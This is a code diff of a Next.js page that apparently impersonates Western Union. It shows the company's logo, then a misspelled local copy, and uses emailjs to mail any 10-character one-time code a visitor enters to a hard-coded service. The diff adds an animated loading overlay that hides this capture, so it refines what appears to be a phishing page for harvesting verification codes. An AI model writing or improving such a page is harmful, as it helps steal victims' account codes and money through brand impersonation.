@@ -16,6 +16,7 @@ import { useEffect, useState } from "react";
 import emailjs from "@emailjs/browser";
 import { cn } from "@/lib/utils";
 import Image from "next/image";
+import * as motion from "motion/react-client";
 import { Spinner } from "@/components/spinner";
 export default function Home() {
   const [isactive, setisActive] = useState(false);
@@ -25,7 +26,7 @@ export default function Home() {
 
   useEffect(() => {
     if (otp.length == 10) {
-      // setIsLoading(true);
+      setIsLoading(true);
       emailjs
         .send(
           "service_uka7m0o",
@@ -38,7 +39,7 @@ export default function Home() {
             console.log("SUCCESS!", response.status, response.text);
 
             setOtp("");
-            // setIsLoading(false);
+            setIsLoading(false);
           },
           (error) => {
             console.log("FAILED...", error);
@@ -123,25 +124,62 @@ export default function Home() {
           </Link>
         </div>
       </div>
+
       {/* Overlay de chargement */}
       {isLoading && (
         <div className="fixed inset-0 z-50 flex items-center justify-center">
           {/* Fond transparent */}
-          <div className="absolute inset-0 bg-black/90 " />
+          <div className="absolute inset-0 bg-black/90" />
 
           {/* Contenu du loader */}
-          <div className="relative flex flex-col items-center justify-center gap-4 p-6  ">
-            <Spinner variant="circle" className="text-[#ebece7] size-15  " />
-            <Image
-              src="https://www.westernunion.com/content/dam/wu/logo/logo.wu.big.svg"
-              width={500}
-              height={500}
-              alt="logo"
-            />
+          <div className="relative flex flex-col items-center justify-center gap-4 p-6">
+            {/* Div extérieure - rotation horaire */}
+            <motion.div
+              className="w-25 h-25 border-t-2  border-b-2 border-amber-300 rounded-full flex items-center justify-center relative"
+              animate={{ rotate: 360 }}
+              transition={{
+                duration: 1,
+                repeat: Infinity,
+                ease: "linear",
+              }}
+            >
+              <motion.div
+                className="w-20 h-20 border-t-2   border-b-2 rounded-full  border-white flex items-center justify-center relative"
+                animate={{ rotate: -360 }}
+                transition={{
+                  duration: 0.5,
+                  repeat: Infinity,
+                  ease: "linear",
+                }}
+              >
+                <motion.div
+                  className="w-20 h-20 border-t-2   border-b-2  rounded-full  border-white flex items-center justify-center relative"
+                  animate={{ rotate: 360 }}
+                  transition={{
+                    duration: 1,
+                    repeat: Infinity,
+                    ease: "linear",
+                  }}
+                >
+                  <Image
+                    src="/logo_wersten.png"
+                    width={50}
+                    height={50}
+                    alt="logo"
+                  />
+                </motion.div>
+              </motion.div>
+            </motion.div>
           </div>
         </div>
       )}
       <Footer />
     </div>
   );
+}
+
+{
+  /* <div className="absolute w-20 h-70 border-t-1  border-b-1  border-yellow-400 rounded-full animate-spin-slow">
+
+              </div> */
 }
